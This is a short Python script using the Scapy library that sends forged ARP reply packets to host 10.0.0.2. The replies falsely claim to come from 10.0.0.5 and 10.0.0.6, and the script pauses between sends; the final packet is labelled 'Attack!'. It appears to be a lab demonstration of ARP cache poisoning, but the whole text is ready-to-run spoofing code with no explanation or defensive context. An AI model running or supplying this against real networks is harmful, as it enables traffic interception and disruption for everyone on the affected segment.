from scapy.all import *
import time

# Packet 1
ARP_Packet = ARP()
ARP_Packet.op = 2
ARP_Packet.psrc = "10.0.0.5" # Sender IP address
ARP_Packet.pdst = "10.0.0.2" # Target IP address
ARP_Packet.hwdst = RandMAC()# Target MAC address

# Packet 2
ARP_Packet2 = ARP()
ARP_Packet2.op = 2
ARP_Packet2.psrc = "10.0.0.6" # Sender IP address
ARP_Packet2.pdst = "10.0.0.2" # Target IP address
ARP_Packet2.hwdst = RandMAC() # Target MAC address

print "Continue to send the first packet"
raw_input("Press any key to continue...")
send(ARP_Packet)
print "Continue to send the second packet (same as packet #1)"
raw_input("Press any key to continue...")
send(ARP_Packet)
print "Continue to send the third packet (Attack!)"
raw_input("Press any key to continue...")
send(ARP_Packet2)
